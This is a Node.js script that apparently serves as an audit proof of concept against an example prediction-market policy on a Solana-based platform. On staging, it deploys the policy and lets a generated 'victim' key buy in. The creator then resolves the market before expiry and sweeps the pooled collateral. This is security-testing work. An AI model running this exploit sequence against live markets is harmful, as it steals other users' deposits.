#!/usr/bin/env node
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

const skillRoot = path.resolve(path.dirname(new URL(import.meta.url).pathname), "../../..");
const monorepo = process.env.BOUNDED_MONOREPO;
if (!monorepo) throw new Error("BOUNDED_MONOREPO is required");
const dev = path.join(monorepo, "dev");
const require = createRequire(path.join(monorepo, "packages/cdk/package.json"));
const { Keypair } = require("@solana/web3.js");
const bs58 = require("bs58").default;
const victimSecret = bs58.encode(Keypair.generate().secretKey);
const page = readFileSync(path.join(skillRoot, "bounded-onchain/docs/examples/prediction-market-amm.md"), "utf8");
const match = page.match(/## Policy\n[\s\S]*?```json\n([\s\S]*?)\n```/);
if (!match) throw new Error("prediction-market policy block was not found");

const runId = `${Date.now().toString(36)}${Math.floor(Math.random() * 10000)}`;
const cwd = path.join(tmpdir(), `bounded-audit-prediction-${runId}`);
mkdirSync(cwd, { recursive: true });
writeFileSync(path.join(cwd, "policy.json"), `${match[1]}\n`);
writeFileSync(path.join(cwd, "bounded.json"), JSON.stringify({
  environment: "staging",
  policy: "policy.json",
  account: { keySource: "profile", profile: "global" }
}));

function bounded(args, actor = "creator") {
  const command = actor === "victim"
    ? ["env", `BOUNDED_PRIVATE_KEY=${victimSecret}`, "bounded", ...args]
    : ["bounded", ...args];
  return execFileSync(dev, ["exec", "--", ...command], {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    timeout: 240_000
  });
}

const app = JSON.parse(bounded(["deploy", "policy.json", "--create", "--name", `audit-early-resolve-${runId}`.slice(0, 40), "--public", "--json"]));
if (!app.ok || !app.appId) throw new Error("deployment did not return an appId");
const marketId = `m_${runId}`;
const holderId = `victim_${runId}`;
const expiryTs = Math.floor(Date.now() / 1000) + 31_536_000;
bounded(["data", "set", "--app-id", app.appId, "--path", `pmMarkets/${marketId}`, "--data", JSON.stringify({
  question: "Future-dated audit market",
  expiryTs,
  claimWindowSec: 604800,
  collateralReserve: 10000000,
  yesSupply: 10000000,
  seedSupply: 10000000
})]);
bounded(["data", "set", "--app-id", app.appId, "--path", `pmPositions/${marketId}/holders/${holderId}`, "--data", JSON.stringify({ yesBalance: 0 })], "victim");
bounded(["data", "set", "--app-id", app.appId, "--path", `pmPositions/${marketId}/holders/${holderId}/buys/buy`, "--data", JSON.stringify({ amountIn: 10000000 })], "victim");
bounded(["data", "set", "--app-id", app.appId, "--path", `pmResolves/${marketId}`, "--data", JSON.stringify({ outcome: "NO" })]);
bounded(["data", "set", "--app-id", app.appId, "--path", `pmWithdrawals/${marketId}`, "--data", JSON.stringify({ amount: 20000000 })]);
const market = JSON.parse(bounded(["data", "get", "--app-id", app.appId, "--path", `pmMarkets/${marketId}`, "--json"]));
const record = market?.data ?? market;
if (record?.collateralReserve !== 0) throw new Error(`expected reserve 0, got ${JSON.stringify(market)}`);

console.log(JSON.stringify({
  result: "PASS",
  appId: app.appId,
  marketId,
  expiryTs,
  resolvedBeforeExpiry: Math.floor(Date.now() / 1000) < expiryTs,
  unrelatedVictimBoughtBeforeResolution: true,
  victimCollateralInPot: 10000000,
  outcome: "NO",
  sweptAmount: 20000000,
  finalCollateralReserve: record.collateralReserve
}, null, 2));
